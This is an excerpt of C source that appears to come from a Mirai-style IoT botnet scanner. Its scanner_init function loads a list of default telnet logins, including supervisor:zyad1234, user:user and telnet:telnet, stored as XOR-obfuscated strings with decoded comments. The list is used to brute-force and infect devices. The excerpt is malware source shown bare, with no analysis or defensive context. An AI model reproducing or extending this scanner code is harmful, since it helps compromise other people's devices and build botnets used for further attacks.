...
void scanner_init(void)
{
    ...
    // Set up passwords
    //add_auth_entry("\x50\x4D\x4D\x56", "", 1);                                                                    // root:(none)
    ...
    add_auth_entry("\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", "\x58\x5B\x43\x46\x13\x10\x11\x16\x22", 2);          // supervisor:zyad1234
    ...
    //add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x1B\x1A\x1A", 15);                                               // admin:1988
    ...
    add_auth_entry("\x57\x51\x47\x50", "\x57\x51\x47\x50", 15);                                                     // user:user
    ...
    add_auth_entry("\x56\x47\x4E\x4C\x47\x56", "\x56\x47\x4E\x4C\x47\x56", 5);                                      // telnet:telnet
